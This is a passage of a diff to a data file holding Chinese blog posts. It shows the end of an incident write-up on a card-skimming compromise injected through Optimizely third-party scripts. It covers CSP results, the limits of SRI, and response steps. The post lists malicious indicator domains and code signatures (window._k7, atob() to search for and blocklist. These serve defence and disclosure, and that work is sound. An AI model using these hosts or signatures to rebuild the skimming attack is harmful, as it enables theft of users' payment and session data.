+    critical script-src 含 strict-dynamic：vendor 插入的新脚本会被信任
+    critical script-src 含 unsafe-eval：内联并 eval 的兜底副本照样执行
+    high     connect-src 允许通配，外发不受限
+
+[BLOCKED] C 严格 script-src + 收窄 connect-src
+    info     白名单主机是整域放行：cdn.optimizely.com</code></pre>
+
+<p>C 也不是完美的——整域放行意味着 cdn.optimizely.com 上任何一个新路径仍然被允许。这是白名单机制的天花板：它管主机，不管内容。要管内容，只有两条路，SRI 或自托管。</p>
+
+<p>SRI 在这里不适用：Optimizely 的脚本 URL 里那段数字是客户 ID，内容会随实验配置变，钉死哈希等于随机挂掉线上实验。这也解释了为什么标签管理器生态整体绕开 SRI。</p>
+
+<p>自托管则是另一回事。本站从 2026 年起把所有第三方库搬进同源目录 /assets/cdn/，页面上没有一个跨域 script 标签。这不是洁癖，是这次事件里唯一 100% 生效的防御：没有第三方脚本，就没有第三方脚本投毒。代价是你得自己跟进版本更新，而且用不了 Optimizely 这类必须在供应商侧渲染的 A/B 工具。</p>
+
+<h2>如果你怀疑自己中了</h2>
+
+<ul>
+<li>查每个 Optimizely 项目的 Project JavaScript 与实验自定义代码，搜 1688360.cc、atob( 和任何不是自己写的 script 标签。注意 base64 变体搜不到域名，要一并搜 atob(。</li>
+<li>11 月 16 日在自有表单里填过卡号的用户，按泄露处理并通知；托管支付 iframe 内的卡不受影响，可以据此收窄通知范围。</li>
+<li>没有 HttpOnly 标记的 cookie 里的会话令牌与密钥，全部轮换。</li>
+<li>审计 Optimizely 账户的写入权限：成员、API token、第三方集成，逐个确认后轮换。</li>
+<li>iPhone/iPad 用户升到 iOS 18.7.3+ 或 26.3+；10 月到 11 月之间在该站做过链上转账的，核对一下实际到账地址。</li>
+<li>IoC 值得直接进防火墙和 DNS 黑名单：1688360.cc、webshell.lol、5vobauua3ojpklx.icu、eil786npto9u5bq.icu、l7bcsnwc7nzr3uo.icu、linkforge.cc、ios-hack.icu。代码特征可以搜 window._k7、window.__k7b、data-channel-code="02111110"。</li>
+</ul>
+
+<p>最后说一句不太受欢迎的话。这次 178 家机构里，有 32 家银行、23 家 SaaS，安全预算都不低，扫描器、WAF、SOC 一样不缺，但挡住的只有 15%。原因不复杂：这些工具全都盯着「自己发布的东西」，而这次攻击发生在「自己信任的东西」上。这两者之间的缝隙，目前只能靠定期比对字节和砍掉不必要的信任来填——前者能上自动化，后者需要有人肯跟市场部门吵架。</p>
+''',
+    'related': [("AI 帮你审代码之后：漏洞台账为什么还是修不完", "blog/ai-code-audit-triage-2026/"), ("KV 缓存也能被投毒：vLLM 与 SGLang 的哈希碰撞问题", "blog/llm-cache-poisoning-2026/"), ("Black October 2026：供应链、证书与开源投毒的连环账", "blog/php2shell-black-october-2026/")],
+},
+{
     'slug': 'qwen4-max-cost-per-task-2026',
     'category': 'ai',
     'date': '2026-11-16',
